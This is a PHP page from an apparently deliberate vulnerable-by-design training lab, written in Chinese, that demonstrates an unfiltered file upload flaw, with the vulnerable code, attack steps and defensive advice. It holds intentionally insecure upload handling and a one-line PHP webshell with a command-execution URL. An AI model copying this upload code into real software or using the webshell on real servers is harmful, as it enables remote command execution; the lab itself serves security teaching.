<?php
// 无过滤文件上传漏洞
$module_name = '01. 无过滤文件上传';
$module_icon = '📁';
$module_desc = '完全没有任何过滤的文件上传漏洞，攻击者可以上传任意类型的文件。';

// 漏洞代码
$message = '';
$uploaded_file = '';

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    if (isset($_FILES['file'])) {
        $file = $_FILES['file'];
        
        // 漏洞：完全没有任何过滤
        $upload_dir = 'uploads/';
        if (!file_exists($upload_dir)) {
            mkdir($upload_dir, 0777, true);
        }
        
        $target_file = $upload_dir . basename($file['name']);
        
        // 直接移动文件，没有任何验证
        if (move_uploaded_file($file['tmp_name'], $target_file)) {
            $message = '文件上传成功！';
            $uploaded_file = $target_file;
        } else {
            $message = '文件上传失败！';
        }
    }
}

// 页面内容
$content = '<div class="card">
        <div class="card-header">
            <h5 class="mb-0">📁 无过滤文件上传漏洞</h5>
        </div>
        <div class="card-body">
            <div class="alert alert-danger">
                <strong>💡 漏洞说明：</strong><br>
                本场景演示完全没有任何过滤的文件上传漏洞。<br>
                服务器对上传的文件类型、大小、内容等没有任何验证和过滤，攻击者可以上传任意类型的文件，包括PHP恶意文件。
            </div>

            <div class="card mb-3">
                <div class="card-header">
                    <h6>🔍 漏洞代码</h6>
                </div>
                <div class="card-body">
                    <pre class="bg-dark text-light p-3 rounded"><code>if (isset($_FILES['file'])) {
    $file = $_FILES['file'];
    
    // 漏洞：完全没有任何过滤
    $upload_dir = 'uploads/';
    if (!file_exists($upload_dir)) {
        mkdir($upload_dir, 0777, true);
    }
    
    $target_file = $upload_dir . basename($file['name']);
    
    // 直接移动文件，没有任何验证
    if (move_uploaded_file($file['tmp_name'], $target_file)) {
        echo '文件上传成功！';
    } else {
        echo '文件上传失败！';
    }
}</code></pre>
                </div>
            </div>

            <div class="card mb-3">
                <div class="card-header">
                    <h6>🎯 攻击演示</h6>
                </div>
                <div class="card-body">
                    <p class="mb-3">本场景演示无过滤文件上传漏洞，攻击者可以上传任意类型的文件，包括PHP恶意文件。尝试以下攻击步骤：</p>

                    <ol>
                        <li>创建一个PHP恶意文件，例如：</li>
                        <pre class="bg-dark text-light p-3 rounded"><code>&lt;?php
// webshell.php
system($_GET[\'cmd\']);
?&gt;</code></pre>
                        <li>通过下方表单上传该文件</li>
                        <li>访问上传后的文件，例如：<code>http://localhost/zhaosec/upload/uploads/webshell.php?cmd=whoami</code></li>
                        <li>执行任意系统命令</li>
                    </ol>
                </div>
            </div>

            <div class="card mb-3">
                <div class="card-header">
                    <h6>💻 实际测试</h6>
                </div>
                <div class="card-body">
                    <form method="POST" enctype="multipart/form-data" class="mb-3">
                        <div class="mb-3">
                            <label for="file" class="form-label">选择文件</label>
                            <input type="file" name="file" id="file" class="form-control">
                        </div>
                        <button type="submit" class="btn btn-danger">上传文件</button>
                    </form>

                    ';

if ($message) {
    if (strpos($message, '成功') !== false) {
        $content .= '<div class="alert alert-success">
                        <strong>操作结果：</strong>
                        <p>' . htmlspecialchars($message) . '</p>';
        if ($uploaded_file) {
            $content .= '<p>上传文件路径：<code>' . htmlspecialchars($uploaded_file) . '</code></p>';
            $content .= '<p>访问链接：<a href="' . htmlspecialchars($uploaded_file) . '" target="_blank">' . htmlspecialchars($uploaded_file) . '</a></p>';
        }
        $content .= '</div>';
    } else {
        $content .= '<div class="alert alert-danger">
                        <strong>操作结果：</strong>
                        <p>' . htmlspecialchars($message) . '</p>
                    </div>';
    }
}

$content .= '                </div>
            </div>

            <div class="card">
                <div class="card-header">
                    <h6>🛡️ 防御建议</h6>
                </div>
                <div class="card-body">
                    <ol>
                        <li><strong>文件类型验证：</strong>使用白名单验证文件扩展名和MIME类型</li>
                        <li><strong>文件内容验证：</strong>检查文件头部特征，确保文件类型与扩展名匹配</li>
                        <li><strong>文件大小限制：</strong>限制上传文件的大小，防止DoS攻击</li>
                        <li><strong>重命名文件：</strong>使用随机文件名，避免路径遍历攻击</li>
                        <li><strong>存储位置：</strong>将上传文件存储在Web根目录外，或使用不可执行的目录</li>
                        <li><strong>权限控制：</strong>设置上传目录为不可执行，限制文件权限</li>
                        <li><strong>WAF防护：</strong>部署Web应用防火墙，过滤恶意文件</li>
                    </ol>
                </div>
            </div>
        </div>
    </div>';

// 包含模板
include '../template/module_template.php';
?>